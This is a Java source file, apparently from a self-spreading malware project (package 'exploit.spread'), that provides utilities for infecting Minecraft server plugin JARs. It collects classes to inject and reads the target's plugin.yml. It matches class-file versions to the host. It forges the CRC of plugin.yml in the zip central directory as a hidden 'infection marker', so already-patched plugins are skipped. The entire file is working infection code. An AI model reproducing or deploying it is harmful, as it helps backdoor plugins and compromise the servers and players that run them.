package com.tmquan2508.exploit.spread;

import com.tmquan2508.exploit.Exploit;
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.net.JarURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.util.*;
import java.util.logging.Level;
import java.util.zip.CRC32;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

public final class PatchUtils {

    public static String stackTrace(Throwable e) {
        StringWriter sw = new StringWriter();
        e.printStackTrace(new PrintWriter(sw));
        return sw.toString();
    }

    public static List<Class<?>> getClassesToInject(Class<?> baseClass) {
        List<Class<?>> classes = new ArrayList<>();
        classes.add(baseClass);
        classes.addAll(Arrays.asList(baseClass.getDeclaredClasses()));
        return classes;
    }

    public static Map<String, Object> readPluginYAML(String path) {
        String inputFile;
        String absolutePath = new File(path).getAbsolutePath();

        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            inputFile = "jar:file:/" + absolutePath.replace('\\', '/') + "!/plugin.yml";
        } else {
            inputFile = "jar:file://" + absolutePath + "!/plugin.yml";
        }

        try {
            URL url = new URL(inputFile);
            JarURLConnection connection = (JarURLConnection) url.openConnection();
            connection.setUseCaches(false);
            try (InputStream is = connection.getInputStream()) {
                return new Yaml().load(is);
            }
        } catch (Exception e) {
            Exploit.sender.sendDebug(Level.WARNING, "[!] PatchUtils: Failed to read plugin.yml from '" + inputFile + "'. Error: " + e.getMessage());
            return null;
        }
    }

    public static int findDominantMajorVersion(Path jarPath) {
        Map<Integer, Integer> counts = new HashMap<>();
        try (ZipFile zipFile = new ZipFile(jarPath.toFile())) {
            Enumeration<? extends ZipEntry> entries = zipFile.entries();
            while (entries.hasMoreElements()) {
                ZipEntry entry = entries.nextElement();
                if (entry.getName().endsWith(".class")) {
                    try (InputStream is = zipFile.getInputStream(entry)) {
                        byte[] header = new byte[8];
                        if (is.read(header) == 8) {
                            if (ByteBuffer.wrap(header, 0, 4).getInt() == 0xCAFEBABE) {
                                int majorVersion = ByteBuffer.wrap(header, 6, 2).getShort() & 0xFFFF;
                                counts.put(majorVersion, counts.getOrDefault(majorVersion, 0) + 1);
                            }
                        }
                    }
                }
            }
        } catch (IOException e) {
            Exploit.sender.sendDebug(Level.WARNING, "[Patcher] Could not scan for major version: " + e.getMessage());
            return 52;
        }

        return counts.entrySet().stream()
            .max(Map.Entry.comparingByValue())
            .map(Map.Entry::getKey)
            .orElse(52);
    }

    public static void setMajorVersion(byte[] classBytes, int newMajorVersion) {
        if (classBytes.length < 8) return;
        classBytes[6] = (byte) (newMajorVersion >> 8);
        classBytes[7] = (byte) newMajorVersion;
    }
    
    // --- Infection Marker & CRC Utils ---
    private static final int EOCD_SIGNATURE = 0x06054b50;
    private static final int CENTRAL_DIR_SIGNATURE = 0x02014b50;
    private static final String FAKE_STRING = "openbd.injected";

    public static boolean isAlreadyPatched(Path jarPath) {
        try (ZipFile zipFile = new ZipFile(jarPath.toFile())) {
            ZipEntry entry = zipFile.getEntry("plugin.yml");
            if (entry == null) return false;
            long storedCrc = entry.getCrc();
            long expectedCrc = calculateFakeCRC();
            if (storedCrc == expectedCrc) {
                Exploit.sender.sendDebug(Level.INFO, "[+] PatchCheck: Plugin already patched (marker found).");
                return true;
            }
        } catch (IOException e) {
            Exploit.sender.sendDebug(Level.WARNING, "[!] PatchCheck: Could not check for fake CRC marker: " + e.getMessage());
        }
        return false;
    }

    public static void setInfectionMarkerOnTarget(Path targetJarPath) throws IOException {
        try {
            Exploit.sender.sendDebug(Level.INFO, "[+] Marker: Setting infection marker by faking plugin.yml CRC...");
            markJarWithFakeCRC(targetJarPath.toFile());
            Exploit.sender.sendDebug(Level.INFO, "[+] Marker: Fake CRC marker set successfully.");
        } catch (Exception e) {
            throw new IOException("Failed to set fake marker on " + targetJarPath.getFileName(), e);
        }
    }

    private static void markJarWithFakeCRC(File jarFile) throws IOException {
        byte[] bytes = Files.readAllBytes(jarFile.toPath());
        int eocdOffset = findEOCDOffset(bytes);
        if (eocdOffset == -1) throw new IOException("EOCD not found");

        int centralDirOffset = getIntLE(bytes, eocdOffset + 16);
        int currentOffset = centralDirOffset;

        while (getIntLE(bytes, currentOffset) == CENTRAL_DIR_SIGNATURE) {
            int fileNameLength = getShortLE(bytes, currentOffset + 28);
            String filename = new String(bytes, currentOffset + 46, fileNameLength, StandardCharsets.UTF_8);

            if ("plugin.yml".equals(filename)) {
                int crcOffset = currentOffset + 16;
                putIntLE(bytes, crcOffset, (int) calculateFakeCRC());
                Files.write(jarFile.toPath(), bytes, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);
                return;
            }
            int extraFieldLength = getShortLE(bytes, currentOffset + 30);
            int fileCommentLength = getShortLE(bytes, currentOffset + 32);
            currentOffset += 46 + fileNameLength + extraFieldLength + fileCommentLength;
        }
        throw new IOException("plugin.yml not found in central directory");
    }

    private static long calculateFakeCRC() {
        CRC32 crc = new CRC32();
        crc.update(FAKE_STRING.getBytes(StandardCharsets.UTF_8));
        return crc.getValue();
    }

    private static int findEOCDOffset(byte[] bytes) {
        for (int i = bytes.length - 22; i >= 0; i--) {
            if (getIntLE(bytes, i) == EOCD_SIGNATURE) return i;
        }
        return -1;
    }

    private static int getIntLE(byte[] b, int off) {
        return (b[off] & 0xFF) | ((b[off + 1] & 0xFF) << 8) | ((b[off + 2] & 0xFF) << 16) | ((b[off + 3] & 0xFF) << 24);
    }

    private static void putIntLE(byte[] b, int off, int val) {
        b[off] = (byte) (val & 0xFF);
        b[off + 1] = (byte) ((val >> 8) & 0xFF);
        b[off + 2] = (byte) ((val >> 16) & 0xFF);
        b[off + 3] = (byte) ((val >> 24) & 0xFF);
    }

    private static int getShortLE(byte[] b, int off) {
        return (b[off] & 0xFF) | ((b[off + 1] & 0xFF) << 8);
    }
}